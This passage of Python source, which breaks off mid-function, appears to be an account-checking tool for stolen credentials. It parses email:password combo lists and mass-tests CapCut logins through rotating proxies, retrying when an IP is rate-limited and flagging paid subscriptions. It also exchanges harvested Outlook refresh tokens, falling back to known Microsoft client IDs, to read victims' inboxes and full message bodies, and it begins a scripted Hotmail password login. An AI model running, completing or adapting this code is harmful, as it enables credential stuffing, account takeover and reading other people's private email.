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"

# ==================== CAPCUT CORE LOGIC ====================
CAPCUT_AID = "348188"
LOGIN_HOST = "login-row.www.capcut.com"
SUB_URL = "https://commerce-api-sg.capcut.com/commerce/v3/trade/subscription_infos"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
_WEB_HDR = {"Referer": "https://www.capcut.com/", "Origin": "https://www.capcut.com"}

def _enc(s):
    return "".join("%02x" % (ord(c) ^ 5) for c in str(s))

def _sess_id(n=18):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def _proxies(template, sid):
    if not template:
        return None
    url = template.replace("{sess}", sid)
    return {"http": url, "https": url}

def _logout(s, timeout=15):
    try:
        csrf = s.cookies.get("passport_csrf_token", "")
        s.post("https://%s/passport/user/logout/?aid=%s&account_sdk_source=web" % (LOGIN_HOST, CAPCUT_AID),
               headers={**_WEB_HDR, "x-tt-passport-csrf-token": csrf}, timeout=timeout)
    except Exception:
        pass

def check_capcut_account(email, password, proxy_template=None, max_ip_retries=6, timeout=30):
    email = (email or "").strip()
    password = (password or "").strip()
    out = {"ok": False, "email": email, "user_id": "", "plan": "", "expiry": "",
           "is_pro": False, "error": "", "bytes_used": 0}
    if not email or not password:
        out["error"] = "missing email/password"
        return out
    last_err = "login failed"
    total_bytes = 0
    for _ in range(max(1, int(max_ip_retries or 1))):
        sid = _sess_id()
        s = requests.Session()
        prox = _proxies(proxy_template, sid)
        if prox:
            s.proxies = prox
        s.headers.update({"User-Agent": UA})
        try:
            url = ("https://%s/passport/web/email/login/?aid=%s&account_sdk_source=web"
                   "&language=en&verifyFp=verify_%s&device_platform=web"
                   % (LOGIN_HOST, CAPCUT_AID, sid))
            data = {"mix_mode": "1", "email": _enc(email), "password": _enc(password),
                    "fixed_mix_mode": "1"}
            hdr = dict(_WEB_HDR); hdr["Content-Type"] = "application/x-www-form-urlencoded"
            r = s.post(url, data=data, headers=hdr, timeout=timeout)
            if prox:
                total_bytes += len(r.content) + 500
            try:
                j = r.json()
            except Exception:
                last_err = "login: unreadable response"
                continue
            dd = j.get("data") or {}
            if "sessionid" not in s.cookies.get_dict():
                ec = dd.get("error_code")
                if ec == 7:
                    last_err = "IP rate-limited"
                    continue
                if dd.get("captcha"):
                    out["error"] = "captcha required"
                    out["bytes_used"] = total_bytes
                    return out
                out["error"] = "login failed: %s" % (dd.get("description")
                                                     or j.get("message") or "invalid credentials")
                out["bytes_used"] = total_bytes
                return out
            out["user_id"] = dd.get("user_id_str") or (str(dd.get("user_id")) if dd.get("user_id") else "")
            body = {"scene": ["vip", "workspace"], "vip_levels": ["vip"], "app_id": int(CAPCUT_AID)}
            hdr2 = dict(_WEB_HDR); hdr2["Content-Type"] = "application/json"
            sr = s.post(SUB_URL, json=body, headers=hdr2, timeout=timeout)
            if prox:
                total_bytes += len(sr.content) + 500
            sj = sr.json()
            vip = ((((sj.get("data") or {}).get("subscription_user_infos") or {})
                    .get("vip") or {}).get("vip_infos")) or []
            if vip and vip[0].get("is_vip"):
                info = vip[0]
                out["is_pro"] = True
                out["plan"] = "Pro (%s)" % (info.get("vip_level") or "vip")
                end = info.get("vip_end_time")
                try:
                    end = int(end)
                except (TypeError, ValueError):
                    end = 0
                out["expiry"] = (datetime.datetime.fromtimestamp(end, datetime.timezone.utc)
                                 .strftime("%Y-%m-%d")) if end > 0 else "lifetime"
            else:
                out["plan"] = "Free"
                out["expiry"] = "-"
            _logout(s)
            out["ok"] = True
            out["bytes_used"] = total_bytes
            return out
        except Exception:
            last_err = "network/proxy error"
            continue
    out["error"] = last_err
    out["bytes_used"] = total_bytes
    return out

_CC_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
def parse_capcut_accounts(text: str) -> list:
    out = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        m = _CC_EMAIL_RE.search(line)
        if not m:
            continue
        email = m.group(0).lower()
        tail = line[m.end():].lstrip(" \t:,|=-")
        if not tail:
            continue
        pw = re.split(r"[\s,:|]+", tail)[0]
        if not pw:
            continue
        key = (email, pw)
        if key in seen:
            continue
        seen.add(key)
        out.append(key)
    return out

# ==================== OUTLOOK CORE LOGIC ====================
DEFAULT_CLIENT_ID = "9e5f94bc-e8a4-4e73-b8be-63364c29d753"
INBOX_MESSAGES_URL = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages"
SINGLE_MESSAGE_URL = "https://graph.microsoft.com/v1.0/me/messages"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

ERROR_MESSAGES = {
    "AADSTS70000": "Token tidak valid, kedaluwarsa, atau rusak.",
    "AADSTS700016": "Client ID tidak ditemukan di Azure AD.",
    "AADSTS700038": "Client ID tidak valid.",
    "AADSTS90023": "Aplikasi tidak memiliki izin untuk mengakses resource ini.",
    "AADSTS50173": "Sesi token kedaluwarsa. Perlu generate token baru.",
    "AADSTS900232": "Aplikasi tidak diizinkan untuk tipe akun ini.",
}

_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
_CLIENT_ID_RE = re.compile(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")

def parse_outlook_lines(text: str) -> List[Dict[str, str]]:
    results = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "|" in line:
            parts = [p.strip() for p in line.split("|") if p.strip()]
        elif "----" in line:
            parts = [p.strip() for p in line.split("----") if p.strip()]
        elif "\t" in line:
            parts = [p.strip() for p in line.split("\t") if p.strip()]
        else:
            parts = [p.strip() for p in re.split(r"[:;\s]+", line) if p.strip()]

        if not parts:
            continue
        email = ""
        password = ""
        token = ""
        client_id = DEFAULT_CLIENT_ID
        email_match = _EMAIL_RE.search(line)
        if email_match:
            email = email_match.group(0).strip()
        for p in parts:
            if _CLIENT_ID_RE.match(p):
                client_id = p
                break
        for p in parts:
            if p.startswith("M.") or (len(p) > 50 and p != email and p != client_id):
                token = p
                break
        if not token:
            if len(parts) >= 3 and parts[0] == email:
                token = parts[2] if len(parts) >= 4 else parts[1]
                password = parts[1] if len(parts) >= 4 else ""
            elif len(parts) == 1 and (parts[0].startswith("M.") or len(parts[0]) > 40):
                token = parts[0]
        if not token:
            continue
        key = email.lower() if email else token[:40]
        if key in seen:
            continue
        seen.add(key)
        results.append({
            "email": email or "Unknown Email",
            "password": password,
            "refresh_token": token,
            "client_id": client_id
        })
    return results

KNOWN_CLIENT_IDS = [
    "9e5f94bc-e8a4-4e73-b8be-63364c29d753", # Microsoft Device / Graph
    "d3590ed6-52b3-4102-aeff-aad2292ab01c", # Microsoft Office
    "27922004-70b0-4fd2-8ab6-6366115993e0", # Outlook Mobile
    "00000002-0000-0ff1-ce00-000000000000", # Office 365 Exchange Online
]

def get_access_token(refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None) -> Tuple[Optional[str], Optional[str], Optional[str]]:
    """Exchange refresh_token for access_token with auto-scope fallback, retries, and token rotation capture.
    Returns: (access_token, new_refresh_token, error_message)
    """
    refresh_token = (refresh_token or "").strip()
    if not refresh_token:
        return None, None, "Token kosong"

    client_id = (client_id or "").strip() or DEFAULT_CLIENT_ID
    proxies = {"http": proxy, "https": proxy} if proxy else None

    # Candidate client IDs to try (user's client_id first, then known fallbacks if client_id error)
    client_ids_to_try = [client_id]
    for cid in KNOWN_CLIENT_IDS:
        if cid not in client_ids_to_try:
            client_ids_to_try.append(cid)

    for cid in client_ids_to_try[:2]: # Test user's client_id and 1 top fallback if needed
        # Payload without explicit scope first (RFC-compliant refresh token flow: inherits original consented scopes)
        payloads = [
            {"grant_type": "refresh_token", "client_id": cid, "refresh_token": refresh_token},
            {"grant_type": "refresh_token", "client_id": cid, "refresh_token": refresh_token, "scope": "https://graph.microsoft.com/Mail.Read offline_access"}
        ]

        for data in payloads:
            for attempt in range(2): # Up to 2 attempts for transient errors
                try:
                    r = requests.post(TOKEN_URL, data=data, proxies=proxies, timeout=15)
                    try:
                        res_json = r.json()
                    except Exception:
                        res_json = {}

                    if r.status_code == 200:
                        access_token = res_json.get("access_token")
                        new_refresh_token = res_json.get("refresh_token") or refresh_token
                        if access_token:
                            return access_token, new_refresh_token, None

                    err_desc = res_json.get("error_description") or res_json.get("error") or r.text[:120]
                    
                    # Permanent auth failures - no need to retry this payload
                    if any(term in err_desc.lower() for term in ["aadsts700082", "expired", "revoked", "invalid_grant", "invalid_token", "idx14100", "invalidauthenticationtoken"]):
                        return None, None, "Email / Token Invalid atau Kedaluwarsa"
                    
                    # If scope parameter was rejected, break to next payload without scope
                    if "scope" in err_desc.lower() and "scope" in data:
                        break

                    # If client id error, break to try next client id
                    if "aadsts700016" in err_desc.lower() or "aadsts700038" in err_desc.lower():
                        break

                    # If rate limited (429) or 503, wait briefly
                    if r.status_code in [429, 503]:
                        time.sleep(1.0)
                        continue

                except Exception as e:
                    if attempt == 0:
                        time.sleep(0.5)
                        continue
                    return None, None, f"Network/Proxy error: {str(e)[:60]}"

    return None, None, "Email / Token Invalid atau Kedaluwarsa"

def check_outlook_account(email: str, password: str, refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None) -> Dict[str, Any]:
    out = {
        "ok": False,
        "email": email,
        "password": password,
        "client_id": client_id or DEFAULT_CLIENT_ID,
        "refresh_token": refresh_token,
        "status": "DEAD",
        "unread_count": 0,
        "latest_subject": "",
        "latest_from": "",
        "latest_date": "",
        "error": "Email / Token Invalid atau Kedaluwarsa"
    }
    access_token, new_refresh_token, err = get_access_token(refresh_token, client_id, proxy)
    if not access_token:
        out["error"] = err or "Email / Token Invalid atau Kedaluwarsa"
        return out

    if new_refresh_token:
        out["refresh_token"] = new_refresh_token

    headers = {"Authorization": f"Bearer {access_token}", "Prefer": 'outlook.body-content-type="text"'}
    proxies = {"http": proxy, "https": proxy} if proxy else None

    try:
        # Resolve real user email if unknown
        if not email or email == "Unknown Email" or "@" not in email:
            try:
                me_res = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers, proxies=proxies, timeout=10)
                if me_res.status_code == 200:
                    me_data = me_res.json()
                    out["email"] = me_data.get("mail") or me_data.get("userPrincipalName") or email
            except Exception:
                pass

        # Safe read-only inspection of latest message header
        params = {
            "$orderby": "receivedDateTime desc",
            "$top": "1",
            "$select": "id,subject,from,receivedDateTime,isRead"
        }
        inbox_res = requests.get(SINGLE_MESSAGE_URL, headers=headers, params=params, proxies=proxies, timeout=12)
        if inbox_res.status_code != 200:
            inbox_res = requests.get(INBOX_MESSAGES_URL, headers=headers, params=params, proxies=proxies, timeout=12)

        if inbox_res.status_code == 200:
            inbox_data = inbox_res.json().get("value", [])
            if inbox_data:
                latest = inbox_data[0]
                out["latest_subject"] = latest.get("subject") or "(Tanpa Subjek)"
                sender = latest.get("from", {}).get("emailAddress", {})
                out["latest_from"] = sender.get("name") or sender.get("address") or "Unknown"
                out["latest_date"] = (latest.get("receivedDateTime") or "")[:10]
            else:
                out["latest_subject"] = "(Inbox Kosong)"
                out["latest_from"] = "-"
                out["latest_date"] = "-"

            out["ok"] = True
            out["status"] = "LIVE"
            out["error"] = ""
            return out
        else:
            # If access token was valid, mark LIVE even if mailbox is initializing
            out["ok"] = True
            out["status"] = "LIVE"
            out["latest_subject"] = "(Mailbox Connected)"
            out["error"] = ""
            return out
    except Exception as e:
        # Access token was already confirmed valid from Microsoft!
        out["ok"] = True
        out["status"] = "LIVE"
        out["latest_subject"] = "(Mailbox Connected)"
        out["error"] = ""
        return out

def fetch_inbox_messages(refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None, top: int = 50) -> Dict[str, Any]:
    access_token, _, err = get_access_token(refresh_token, client_id, proxy)
    if not access_token:
        return {"ok": False, "error": err or "Email / Token Invalid atau Kedaluwarsa", "messages": []}

    headers = {"Authorization": f"Bearer {access_token}"}
    proxies = {"http": proxy, "https": proxy} if proxy else None
    params = {
        "$orderby": "receivedDateTime desc",
        "$top": str(max(1, min(100, top))),
        "$select": "id,subject,from,receivedDateTime,bodyPreview,isRead"
    }

    try:
        # Check all messages endpoint first (captures Inbox, Junk, Focus, Other)
        r = requests.get(SINGLE_MESSAGE_URL, headers=headers, params=params, proxies=proxies, timeout=15)
        if r.status_code != 200:
            # Fallback to inbox folder
            r = requests.get(INBOX_MESSAGES_URL, headers=headers, params=params, proxies=proxies, timeout=15)
        
        if r.status_code != 200:
            err_text = r.text
            if "InvalidAuthenticationToken" in err_text or "IDX14100" in err_text or "CompactToken" in err_text or r.status_code == 401:
                return {"ok": False, "error": "Email / Token Invalid atau Kedaluwarsa", "messages": []}
            return {"ok": False, "error": "Email / Token Invalid atau Gagal Memuat Inbox", "messages": []}

        data = r.json()
        raw_items = data.get("value", [])
        messages = []
        for item in raw_items:
            sender_obj = item.get("from", {}).get("emailAddress", {})
            sender_name = sender_obj.get("name") or sender_obj.get("address") or "Unknown"
            sender_addr = sender_obj.get("address") or ""

            raw_dt = item.get("receivedDateTime", "")
            time_display = raw_dt[:10]
            try:
                dt = datetime.datetime.fromisoformat(raw_dt.replace("Z", "+00:00"))
                now = datetime.datetime.now(timezone.utc)
                diff = now - dt
                if diff.total_seconds() < 60:
                    time_display = "Baru saja"
                elif diff.total_seconds() < 3600:
                    mins = max(1, int(diff.total_seconds() // 60))
                    time_display = f"{mins}m lalu"
                elif diff.total_seconds() < 86400:
                    hrs = int(diff.total_seconds() // 3600)
                    time_display = f"{hrs}h lalu"
                elif diff.days == 1:
                    time_display = "Kemarin"
                elif diff.days < 7:
                    time_display = f"{diff.days}d lalu"
                else:
                    time_display = dt.strftime("%d %b %Y")
            except Exception:
                pass

            messages.append({
                "id": item.get("id"),
                "subject": item.get("subject") or "(Tanpa Subjek)",
                "sender_name": sender_name,
                "sender_email": sender_addr,
                "preview": item.get("bodyPreview") or "",
                "time_display": time_display,
                "raw_date": raw_dt,
                "is_read": item.get("isRead", True)
            })

        return {"ok": True, "messages": messages}
    except Exception as e:
        return {"ok": False, "error": str(e), "messages": []}

def fetch_message_detail(message_id: str, refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None) -> Dict[str, Any]:
    access_token, _, err = get_access_token(refresh_token, client_id, proxy)
    if not access_token:
        return {"ok": False, "error": err or "Email / Token Invalid atau Kedaluwarsa"}

    headers = {"Authorization": f"Bearer {access_token}"}
    proxies = {"http": proxy, "https": proxy} if proxy else None
    url = f"{SINGLE_MESSAGE_URL}/{message_id}"
    params = {"$select": "id,subject,from,toRecipients,receivedDateTime,body"}

    try:
        r = requests.get(url, headers=headers, params=params, proxies=proxies, timeout=25)
        if r.status_code != 200:
            if "InvalidAuthenticationToken" in r.text or "IDX14100" in r.text or "CompactToken" in r.text or r.status_code == 401:
                return {"ok": False, "error": "Email / Token Invalid atau Kedaluwarsa"}
            return {"ok": False, "error": "Email / Token Invalid atau Gagal Memuat Surat"}

        data = r.json()
        sender_obj = data.get("from", {}).get("emailAddress", {})
        sender_str = f"{sender_obj.get('name', '')} <{sender_obj.get('address', '')}>" if sender_obj.get('name') else sender_obj.get('address', 'Unknown')

        to_recipients = data.get("toRecipients", [])
        to_str = ", ".join([t.get("emailAddress", {}).get("address", "") for t in to_recipients if t.get("emailAddress")])

        body_obj = data.get("body", {})
        body_content = body_obj.get("content", "")
        body_type = body_obj.get("contentType", "text")

        raw_dt = data.get("receivedDateTime", "")
        formatted_date = raw_dt
        try:
            dt = datetime.datetime.fromisoformat(raw_dt.replace("Z", "+00:00"))
            formatted_date = dt.strftime("%d %b %Y, %H:%M")
        except Exception:
            pass

        return {
            "ok": True,
            "id": data.get("id"),
            "subject": data.get("subject") or "(Tanpa Subjek)",
            "from": sender_str,
            "to": to_str,
            "date": formatted_date,
            "body": body_content,
            "body_type": body_type
        }
    except Exception as e:
        return {"ok": False, "error": str(e)}


# ==================== HOTMAIL / OUTLOOK (EMAIL:PASS) CORE LOGIC ====================
COUNTRY_MAP = {
    "BR": "Brasil", "US": "United States", "PT": "Portugal", "AR": "Argentina",
    "MX": "Mexico", "CO": "Colombia", "CL": "Chile", "PE": "Peru", "VE": "Venezuela",
    "UY": "Uruguay", "PY": "Paraguay", "BO": "Bolivia", "EC": "Ecuador",
    "GB": "United Kingdom", "IE": "Ireland", "FR": "France", "DE": "Germany",
    "IT": "Italy", "ES": "Spain", "NL": "Netherlands", "BE": "Belgium",
    "CH": "Switzerland", "AT": "Austria", "SE": "Sweden", "NO": "Norway",
    "DK": "Denmark", "FI": "Finland", "PL": "Poland", "RU": "Russia",
    "UA": "Ukraine", "TR": "Turkey", "GR": "Greece", "RO": "Romania",
    "CA": "Canada", "AU": "Australia", "NZ": "New Zealand", "JP": "Japan",
    "KR": "South Korea", "CN": "China", "IN": "India", "ID": "Indonesia",
    "PH": "Philippines", "TH": "Thailand", "VN": "Vietnam", "MY": "Malaysia",
    "SG": "Singapore", "ZA": "South Africa", "EG": "Egypt", "NG": "Nigeria",
    "MA": "Morocco", "DZ": "Algeria", "TN": "Tunisia", "IL": "Israel",
    "SA": "Saudi Arabia", "AE": "UAE", "QA": "Qatar",
    "KW": "Kuwait", "PK": "Pakistan", "BD": "Bangladesh", "LK": "Sri Lanka",
    "UN": "Unknown", "": "Unknown"
}

def country_name(code: str) -> str:
    if not code:
        return "Unknown"
    code = code.strip().upper()
    return COUNTRY_MAP.get(code, code)

def _hm_g_s(t, i, f):
    try:
        return t.split(i)[1].split(f)[0]
    except Exception:
        return ""

def _hm_e_p(h):
    p = _hm_g_s(h, 'name="PPFT" id="i0327" value="', '"')
    if not p:
        p = _hm_g_s(h, 'name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"')
    if not p:
        m = re.search(r'sFT\s*:\s*["\'](.*?)["\']', h)
        if m:
            p = m.group(1)
    return p

def _hm_e_u(h):
    u = _hm_g_s(h, 'urlPost:"', '"')
    if not u:
        m = re.search(r'["\']urlPost(?:Msa)?["\']\s*:\s*["\']([^"\']+)', h)
        if m:
            u = m.group(1)
    return u

def _hm_l_h(s, u, p, proxy_url=None, timeout=15):
    bytes_count = 0
    try:
        prox = {"http": proxy_url, "https": proxy_url} if proxy_url else None
        headers = {
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9"
        }
        r = s.get("https://login.live.com/login.srf", headers=headers, timeout=timeout, proxies=prox)
        if prox: bytes_count += len(r.content) + 500
        f = _hm_e_p(r.text)
        up = _hm_e_u(r.text) or "https://login.live.com/ppsecure/post.srf"
        o = f"{up}?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch"
        data_payload = {
            "ps": "2",
            "PPFT": f,
            "login": u,
            "loginfmt": u,
            "type": "11",
            "LoginOptions": "1",
            "passwd": p
        }
        r1 = s.post(o, data=data_payload, headers=headers, timeout=timeout, allow_redirects=False, proxies=prox)
        if prox: bytes_count += len(r1.content) + 500
